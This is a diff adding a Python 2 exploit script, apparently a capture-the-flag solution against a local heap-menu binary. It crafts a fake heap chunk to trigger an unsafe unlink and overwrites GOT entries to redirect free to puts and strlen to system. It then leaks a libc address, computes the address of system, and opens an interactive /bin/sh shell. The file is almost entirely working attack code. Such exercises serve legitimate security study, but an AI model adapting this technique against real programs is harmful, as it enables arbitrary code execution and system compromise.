@@ -1,0 +1,136 @@
+#!/usr/bin/env python
+#  -*- coding: utf-8 -*-
+import telnetlib
+import struct
+from socket import *
+
+
+def p64(x): return struct.pack("<Q", x)
+
+
+def up64(x): return struct.unpack("<Q", x)[0]
+
+
+def init(ip, port):
+    s = socket(AF_INET, SOCK_STREAM)
+    s.connect((ip, port))
+    return s
+
+
+def interactive(s):
+    t = telnetlib.Telnet()
+    t.sock = s
+    t.interact()
+
+
+def recvuntil(s, ch):
+    data = ""
+    while ch not in data:
+        data += s.recv(1)
+    return data
+
+
+def recvline(s):
+    return recvuntil(s, '\n')
+
+
+def alloc(s, size):
+    s.send("1\n")
+    s.send(str(size) + "\n")
+    print "[alloc] " + recvline(s)[0:-1]
+    result = recvline(s)[0:-1]
+    print result
+
+
+def fill(s, idx, length, content):
+    s.send("2\n")
+    s.send(str(idx) + "\n")
+    s.send(str(length) + "\n")
+    s.send(content)  # 이것만 fread 다른건 다 fgets로
+    print "[fill] " + str(idx)
+    result = recvline(s)[0:-1]
+    print result
+
+
+def wipe(s, idx, leak=False):
+    s.send("3\n")
+    s.send(str(idx) + "\n")
+    print "[wipe] " + str(idx)
+    if leak == True:
+        leaked = recvline(s)[0:-1]
+    else:
+        leaked = ""
+    result = recvline(s)[0:-1]
+    print result
+    return leaked
+
+def strlen(s, idx):   # call strlen_plt(arr[idx])
+    s.send("4\n")
+    s.send(str(idx) + "\n")
+    print "[strlen] " + str(idx)
+
+
+s = init("localhost", 10003)
+
+strlen(s, 0)  # create a buffer for stdout in heap area
+s.recv(4096)  # reset the buffer
+
+alloc(s, 0x30 - 0x8)  # fast chunk idx:1
+alloc(s, 0x200 - 0x8)  # large chunk idx:2
+
+p_global1 = 0x602148
+
+fake_prev_size1 = 0x0
+fake_size = 0x20
+fake_fd = p_global1 - 0x18
+fake_bk = p_global1 - 0x10
+fake_prev_size2 = 0x20
+
+fake_prev_in_use = "\x00"
+
+content = p64(fake_prev_size1) + p64(fake_size) + \
+          p64(fake_fd) + p64(fake_bk) + \
+          p64(fake_prev_size2) + fake_prev_in_use
+
+fill(s, 1, len(content), content)  # make a fake chunk in the chunk1
+
+wipe(s, 2)  # do unlink(fake chunk) \
+            # so that *p_global1 <- pglobal1 - 0x18 : 0x602130
+
+# got & plt
+free_got = 0x602018
+strlen_got = 0x602030
+puts_got = 0x602020
+puts_plt = 0x400760
+
+
+#                    |   global0     |   global1
+content = p64(0) * 2 + p64(free_got) + p64(strlen_got) + \
+          p64(puts_got)
+fill(s, 1, len(content), content)
+
+content = p64(puts_plt)
+fill(s, 0, len(content), content)  
+# Now free() has been replaced by puts()
+
+leaked = wipe(s, 2, leak=True)
+p_puts = up64(leaked + "\x00" * (0x8 - len(leaked)))
+print "p_puts : " + hex(p_puts)
+
+# offsets
+o_system = 0x45390
+o_puts = 0x6f690
+
+libcbase = p_puts - o_puts
+p_system = libcbase + o_system
+
+content = p64(p_system)
+fill(s, 1, len(content), content)
+# Now strlen() has been replaced by system()
+
+alloc(s, 8)  # idx : 3
+content = "/bin/sh"
+fill(s, 3, len(content), content)
+strlen(s, 3)
+interactive(s)
+
